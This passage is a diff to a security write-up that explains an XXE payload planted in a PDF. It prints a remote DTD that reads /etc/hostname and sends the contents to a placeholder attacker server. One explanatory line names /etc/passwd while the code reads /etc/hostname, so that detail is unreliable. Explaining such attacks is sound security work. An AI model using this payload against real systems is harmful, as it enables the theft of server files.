@@ -92,7 +92,19 @@ Here's the breakout from all of this:
 
 The first payload is what I inserted on the PDF file:
 
-1. `<!ENTITY % ext SYSTEM "https://<attacker-server>/poc.dtd">`: This line defines a parameter entity named %ext. Parameter entities are used within the DTD itself. It instructs the XML parser to fetch the content from the remote URL `https://attacker-server/poc.dtd`
+1. `<!ENTITY % ext SYSTEM "https://<attacker-server>/poc.dtd">`: This line defines a parameter entity named `%ext`. Parameter entities are used within the DTD itself. It instructs the XML parser to fetch the content from the remote URL `https://attacker-server/poc.dtd`.
+
+2. `%ext;`: This immediately triggers the parser to process the fetched DTD file.
+
+At this point, the vulnerable server makes an outbound HTTP request to the attacker's server to download poc.dtd. 
+
+The `poc.dtd` file, hosted on the attacker's server, contains the actual exfiltration code:
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % ent "<!ENTITY data SYSTEM 'https://attacker-server/?x=%file;'>">
+```
+1. <code><!ENTITY % file SYSTEM "file:///etc/passwd"></code>: The parser reads this line from the remote DTD. It defines another parameter entity, %file, which is instructed to read the contents of the `/etc/hostname` file from the local server's filesystem.
 
 
 
